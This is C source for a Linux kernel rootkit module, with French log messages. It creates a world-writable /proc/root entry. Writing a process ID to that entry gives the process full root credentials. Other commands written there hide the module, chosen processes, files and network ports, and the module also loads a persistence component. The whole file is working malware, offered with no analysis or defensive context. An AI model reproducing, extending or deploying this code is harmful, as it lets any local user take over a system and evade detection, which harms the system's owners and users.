#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include "hide.h"
#include "hide_file.h"
#include "hide_net.h"
#include "persistence.h"

static pid_t target_pid = 0;

static void grant_root(void) {
    struct cred *new_cred;
    pid_t saved_pid;

    if (target_pid != 0) {
        struct task_struct *task;

        rcu_read_lock();
        task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
        if (!task) {
            rcu_read_unlock();
            printk(KERN_ERR "pid %d introuvable\n", target_pid);
            return;
        }
        saved_pid = task->pid;
        rcu_read_unlock();
    } else {
        saved_pid = current->pid;
    }

    new_cred = prepare_creds();
    if (!new_cred) {
        printk(KERN_ERR "prepare_creds a échoué\n");
        return;
    }

    new_cred->uid.val   = 0;
    new_cred->gid.val   = 0;
    new_cred->euid.val  = 0;
    new_cred->egid.val  = 0;
    new_cred->suid.val  = 0;
    new_cred->sgid.val  = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    commit_creds(new_cred);

    printk(KERN_INFO "root donné au pid %d\n", saved_pid);
}


static ssize_t write_pid(struct file *file, const char __user *buf,
                         size_t count, loff_t *ppos)
{
    char kbuf[256];
    char *name;
    int len;
    pid_t pid;

    if (count > 255)
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    if (strncmp(kbuf, "hide", 4) == 0 && (kbuf[4] == '\0' || kbuf[4] == '\n')) {
        set_hide();
            return count;
    }
    if (strncmp(kbuf, "show", 4) == 0 && (kbuf[4] == '\0' || kbuf[4] == '\n')) {
        unset_hide();
        return count;
    }

    if (strncmp(kbuf, "hideproc:", 9) == 0) {
      pid = simple_strtoul(kbuf + 9, NULL, 10);
        set_hidden_pid(pid);
        return count;
    }

    if (strncmp(kbuf, "hidefile:", 9) == 0) {
        name = kbuf + 9;
        len = strlen(name);
        if (len > 0 && name[len - 1] == '\n')
              name[len - 1] = '\0';
        set_hidden_file(name);
        return count;
    }

    if (strncmp(kbuf, "clearfile", 9) == 0) {
        clear_hidden_file();
        return count;
    }

    if (strncmp(kbuf, "hideport:", 9) == 0) {
        set_hidden_port(simple_strtoul(kbuf + 9, NULL, 10));
        return count;
    }

    target_pid = simple_strtoul(kbuf, NULL, 10);

    grant_root();

    return count;
}

static struct proc_ops proc_fops = {
    .proc_write = write_pid,
};

static struct proc_dir_entry *proc_entry;

static int __init rootkit_init(void) {
    int err;

    printk(KERN_INFO "chargé\n");

    proc_entry = proc_create("root", 0222, NULL, &proc_fops);
    if (!proc_entry) {
        printk(KERN_ERR "impossible de créer /proc/root\n");
        return -ENOMEM;
    }

    err = hide_file_init();
    if (err) {
        remove_proc_entry("root", NULL);
        return err;
    }

    err = hide_net_init();
    if (err) {
        hide_file_exit();
        remove_proc_entry("root", NULL);
        return err;
    }

    err = persistence_init();
    if (err)
        printk(KERN_WARNING "persistence a échoué (%d), on continue quand meme\n", err);

    return 0;
}

static void __exit rootkit_exit(void) {
    persistence_exit();
    hide_net_exit();
    hide_file_exit();
    unset_hide();
    remove_proc_entry("root", NULL);
    printk(KERN_INFO "module déchargé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ME");
